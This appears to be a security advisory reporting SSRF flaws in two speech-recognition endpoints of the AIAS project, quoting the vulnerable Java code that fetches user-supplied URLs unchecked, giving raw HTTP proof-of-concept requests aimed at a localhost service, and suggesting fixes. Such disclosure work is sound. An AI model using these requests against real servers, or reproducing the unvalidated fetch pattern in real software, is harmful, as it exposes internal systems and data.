There are SSRF vulnerabilities in two APIs of AIAS subsystem api_platform

# Vulnerability Description

The open source Java AI one-stop solution project "[mymagicpower/AIAS](https://github.com/mymagicpower/AIAS)" has two APIs in the subsystem "api_platform" that have SSRF vulnerabilities.

- Vulnerability Discloser: [Tr0e](https://github.com/Tr0e)

- Vendors:  [http://aias.top/](http://aias.top/)

- Source code address：[https://github.com/mymagicpower/AIAS](https://github.com/mymagicpower/AIAS)

Note:  **This vulnerability was discovered automatically by my AI code audit tool**.

# Vulnerability Analysis

The vulnerability code entry point is located at：

[3_api_platform/api-platform/src/main/java/top/aias/platform/controller/AsrController.java](https://github.com/mymagicpower/AIAS/blob/main/3_api_platform/api-platform/src/main/java/top/aias/platform/controller/AsrController.java)

The complete relevant code information of the vulnerability exploit chain is as follows:

```java
    @ApiOperation(value = "英文长语音识别-URL")
    @GetMapping(value = "/enAsrForLongAudioUrl", produces = "application/json;charset=utf-8")
    public ResultBean enAsrForLongAudioUrl(@RequestParam(value = "url") String url) {
        Path tempAudioFilePath = null;
        Path tempConvertedAudioFilePath = null;
        try {
            // 解析文件扩展名
            String fileExtension = FileUtils.getFileExtension(url);

            // 下载音频文件
            String tempFileName = UUID.randomUUID() + "." + fileExtension;
            tempAudioFilePath = Files.createTempFile("audio_", tempFileName);

            try (InputStream inputStream = new URL(url).openStream()) {
                Files.copy(inputStream, tempAudioFilePath, StandardCopyOption.REPLACE_EXISTING);
            }

            System.out.println("File saved at: " + tempAudioFilePath);

            if (!"wav".equalsIgnoreCase(fileExtension)) {
                tempFileName = UUID.randomUUID() + ".wav";
                tempConvertedAudioFilePath = Files.createTempFile("audio_", tempFileName);
                AudioUtils.convert(tempAudioFilePath.toString(), tempConvertedAudioFilePath.toString());
            } else {
                tempConvertedAudioFilePath = Paths.get(tempAudioFilePath.toString());
            }

            // 进行音频转录操作
            String texts = asrService.longSpeechToText(tempConvertedAudioFilePath, false);

            return ResultBean.success().add("result", texts);

        } catch (IOException e) {
            logger.error(e.getMessage(), e);
            return ResultBean.failure().add("message", "下载或处理音频文件时发生错误: " + e.getMessage());
        } catch (TranslateException e) {
            logger.error(e.getMessage(), e);
            return ResultBean.failure().add("message", "语音识别失败: " + e.getMessage());
        } catch (ModelException e) {
            logger.error(e.getMessage(), e);
            e.printStackTrace();
            return ResultBean.failure().add("message", e.getMessage());
        } finally {
            // 删除临时文件
            if (tempAudioFilePath != null) {
                try {
                    Files.deleteIfExists(tempAudioFilePath);
                } catch (IOException e) {
                    logger.warn("无法删除临时文件: " + tempAudioFilePath, e);
                }
            }
            // 删除临时文件
            if (tempConvertedAudioFilePath != null) {
                try {
                    Files.deleteIfExists(tempConvertedAudioFilePath);
                } catch (IOException e) {
                    logger.warn("无法删除临时文件: " + tempConvertedAudioFilePath, e);
                }
            }
        }
    }

    @ApiOperation(value = "中文长语音识别-URL")
    @GetMapping(value = "/zhAsrForLongAudioUrl", produces = "application/json;charset=utf-8")
    public ResultBean zhAsrForLongAudioUrl(@RequestParam(value = "url") String url) {
        Path tempAudioFilePath = null;
        Path tempConvertedAudioFilePath = null;
        try {
            // 解析文件扩展名
            String fileExtension = FileUtils.getFileExtension(url);

            // 下载音频文件
            String tempFileName = UUID.randomUUID() + "." + fileExtension;
            tempAudioFilePath = Files.createTempFile("audio_", tempFileName);

            try (InputStream inputStream = new URL(url).openStream()) {
                Files.copy(inputStream, tempAudioFilePath, StandardCopyOption.REPLACE_EXISTING);
            }

            System.out.println("File saved at: " + tempAudioFilePath);

            if (!"wav".equalsIgnoreCase(fileExtension)) {
                tempFileName = UUID.randomUUID() + ".wav";
                tempConvertedAudioFilePath = Files.createTempFile("audio_", tempFileName);
                AudioUtils.convert(tempAudioFilePath.toString(), tempConvertedAudioFilePath.toString());
            } else {
                tempConvertedAudioFilePath = Paths.get(tempAudioFilePath.toString());
            }

            // 进行音频转录操作
            String texts = asrService.longSpeechToText(tempConvertedAudioFilePath, true);

            return ResultBean.success().add("result", texts);

        } catch (IOException e) {
            logger.error(e.getMessage(), e);
            return ResultBean.failure().add("message", "下载或处理音频文件时发生错误: " + e.getMessage());
        } catch (TranslateException e) {
            logger.error(e.getMessage(), e);
            return ResultBean.failure().add("message", "语音识别失败: " + e.getMessage());
        } catch (ModelException e) {
            logger.error(e.getMessage(), e);
            e.printStackTrace();
            return ResultBean.failure().add("message", e.getMessage());
        } finally {
            // 删除临时文件
            if (tempAudioFilePath != null) {
                try {
                    Files.deleteIfExists(tempAudioFilePath);
                } catch (IOException e) {
                    logger.warn("无法删除临时文件: " + tempAudioFilePath, e);
                }
            }
            // 删除临时文件
            if (tempConvertedAudioFilePath != null) {
                try {
                    Files.deleteIfExists(tempConvertedAudioFilePath);
                } catch (IOException e) {
                    logger.warn("无法删除临时文件: " + tempConvertedAudioFilePath, e);
                }
            }
        }
    }
```

It can be seen that the two external APIs "/enAsrForLongAudioUrl" and "/zhAsrForLongAudioUrl" receive the URL parameters passed from the outside, and directly initiate an http request to the target URL through "new URL(url).openStream()" without any verification or filtering, which constitutes a typical SSRF vulnerability.

SSRF (Server-Side Request Forgery) vulnerabilities can allow attackers to access internal systems, services, or sensitive data by exploiting the server's ability to make unauthorized external requests, potentially leading to information disclosure, unauthorized access, or further exploitation within the network.

# Vulnerability Verification

Please first build the project local environment according to the steps provided by the project source code author in the Readme file.

The vulnerability proof of concept (POC) is as follows:

```js
GET /api/asr/enAsrForLongAudioUrl?url=http://127.0.0.1:9000/test.txt HTTP/1.1
Host: 127.0.0.1:8089
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Upgrade-Insecure-Requests: 1
Priority: u=0, i 


GET /api/asr/zhAsrForLongAudioUrl?url=http://127.0.0.1:9000/test.txt HTTP/1.1
Host: 127.0.0.1:8089
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

The relevant verification screenshots are shown below:

![Image](https://private-user-images.githubusercontent.com/42080954/420573720-1cbf2e42-7c03-4fc9-9434-ee73aaec582d.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NDE0MjAzNjIsIm5iZiI6MTc0MTQyMDA2MiwicGF0aCI6Ii80MjA4MDk1NC80MjA1NzM3MjAtMWNiZjJlNDItN2MwMy00ZmM5LTk0MzQtZWU3M2FhZWM1ODJkLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAzMDglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMzA4VDA3NDc0MlomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTA0NDBkOWFlODkzYzk0ZjgyMWFmN2JjMTE1NTZmNzkzMmVlNzg0YWZhZmEwNWNiODVkNjAxYTNjY2FkYmQzOTQmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.PWMXxljJ2uGxLOdAt5wRQNTlbucAs3lb8PgJw0T1PO8)

![Image](https://private-user-images.githubusercontent.com/42080954/420573742-f95bf2e7-667d-4856-a0f8-91ef7efc66f5.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NDE0MjAzNjIsIm5iZiI6MTc0MTQyMDA2MiwicGF0aCI6Ii80MjA4MDk1NC80MjA1NzM3NDItZjk1YmYyZTctNjY3ZC00ODU2LWEwZjgtOTFlZjdlZmM2NmY1LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAzMDglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMzA4VDA3NDc0MlomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWMxYTJkZDg1YjcxNDg1ZjllY2NmMmY5MTYzMTBlZjA4YWU4ZmYzZjcxZWVhYjRjYTRhYjY4MjM4ZjYxNTk0ZWUmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.os6F84kHPPTal8ZnhupcW0iOvV63ol_Ob71HlQSLbzI)

# Security Suggestions

To fix SSRF (Server-Side Request Forgery) vulnerabilities, validate and sanitize all user-supplied input used in HTTP requests, restrict server access to trusted internal resources by implementing proper whitelisting or IP filtering, use secure coding practices to prevent unintended outbound requests, and consider proxying external requests through a controlled intermediary with appropriate access controls.
